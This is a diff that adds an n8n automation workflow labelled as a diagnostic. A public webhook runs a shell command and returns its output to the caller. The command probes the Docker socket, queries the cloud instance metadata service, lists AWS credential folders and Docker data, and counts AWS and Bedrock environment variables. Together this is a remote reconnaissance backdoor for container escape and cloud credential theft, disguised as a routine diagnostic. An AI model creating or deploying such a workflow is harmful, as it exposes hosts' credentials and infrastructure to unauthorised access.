@@ -1,0 +1,180 @@
+{
+  "active": true,
+  "activeVersion": {
+    "updatedAt": "2026-11-26T20:04:34.812Z",
+    "createdAt": "2026-11-26T20:04:34.812Z",
+    "versionId": "8c9e7b1e-0edf-4734-8ffe-2a01356abc3f",
+    "workflowId": "0WOx3bsC7txqykX9",
+    "nodes": [
+      {
+        "parameters": {
+          "httpMethod": "POST",
+          "path": "diagc6khs70v",
+          "responseMode": "responseNode",
+          "options": {}
+        },
+        "id": "n1",
+        "name": "Webhook",
+        "type": "n8n-nodes-base.webhook",
+        "typeVersion": 2,
+        "position": [
+          0,
+          0
+        ],
+        "webhookId": "diagc6khs70v"
+      },
+      {
+        "parameters": {
+          "command": "echo ===SOCK===; ls -la /var/run/docker.sock /run/docker.sock 2>&1; echo ===IMDS===; (curl -s -m 4 http://169.254.169.254/latest/meta-data/ || wget -qO- -T 4 http://169.254.169.254/latest/meta-data/ || echo NOCLIENT) 2>&1 | head -c 200; echo; echo ===AWSDOT===; ls -la /root/.aws /home/node/.aws 2>&1; echo ===DOCKERENV===; ls /var/lib/docker 2>&1 | head; echo ===ENVSUM===; env | grep -icE 'aws|bedrock'"
+        },
+        "id": "n2",
+        "name": "Exec",
+        "type": "n8n-nodes-base.executeCommand",
+        "typeVersion": 1,
+        "position": [
+          220,
+          0
+        ]
+      },
+      {
+        "parameters": {
+          "respondWith": "json",
+          "responseBody": "={{ JSON.stringify($json) }}",
+          "options": {}
+        },
+        "id": "n3",
+        "name": "Respond",
+        "type": "n8n-nodes-base.respondToWebhook",
+        "typeVersion": 1,
+        "position": [
+          440,
+          0
+        ]
+      }
+    ],
+    "connections": {
+      "Webhook": {
+        "main": [
+          [
+            {
+              "node": "Exec",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      },
+      "Exec": {
+        "main": [
+          [
+            {
+              "node": "Respond",
+              "type": "main",
+              "index": 0
+            }
+          ]
+        ]
+      }
+    },
+    "authors": "Matheus Cristhyan",
+    "name": null,
+    "description": null
+  },
+  "activeVersionId": "8c9e7b1e-0edf-4734-8ffe-2a01356abc3f",
+  "connections": {
+    "Webhook": {
+      "main": [
+        [
+          {
+            "node": "Exec",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Exec": {
+      "main": [
+        [
+          {
+            "node": "Respond",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "createdAt": "2026-11-26T20:04:34.715Z",
+  "id": "0WOx3bsC7txqykX9",
+  "isArchived": false,
+  "meta": null,
+  "name": "diag-diagc6khs70v",
+  "nodes": [
+    {
+      "parameters": {
+        "httpMethod": "POST",
+        "path": "diagc6khs70v",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "n1",
+      "name": "Webhook",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 2,
+      "position": [
+        0,
+        0
+      ],
+      "webhookId": "diagc6khs70v"
+    },
+    {
+      "parameters": {
+        "command": "echo ===SOCK===; ls -la /var/run/docker.sock /run/docker.sock 2>&1; echo ===IMDS===; (curl -s -m 4 http://169.254.169.254/latest/meta-data/ || wget -qO- -T 4 http://169.254.169.254/latest/meta-data/ || echo NOCLIENT) 2>&1 | head -c 200; echo; echo ===AWSDOT===; ls -la /root/.aws /home/node/.aws 2>&1; echo ===DOCKERENV===; ls /var/lib/docker 2>&1 | head; echo ===ENVSUM===; env | grep -icE 'aws|bedrock'"
+      },
+      "id": "n2",
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        220,
+        0
+      ]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json) }}",
+        "options": {}
+      },
+      "id": "n3",
+      "name": "Respond",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [
+        440,
+        0
+      ]
+    }
+  ],
+  "pinData": null,
+  "settings": {
+    "executionOrder": "v1",
+    "callerPolicy": "workflowsFromSameOwner",
+    "availableInMCP": false
+  },
+  "shared": [
+    {
+      "updatedAt": "2026-11-26T20:04:34.715Z",
+      "createdAt": "2026-11-26T20:04:34.715Z",
+      "role": "workflow:owner",
+      "workflowId": "0WOx3bsC7txqykX9",
+      "projectId": "AxNpta0sA2v4gJ2a"
+    }
+  ],
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 1,
+  "updatedAt": "2026-11-26T20:04:34.715Z",
+  "versionId": "8c9e7b1e-0edf-4734-8ffe-2a01356abc3f"
+}
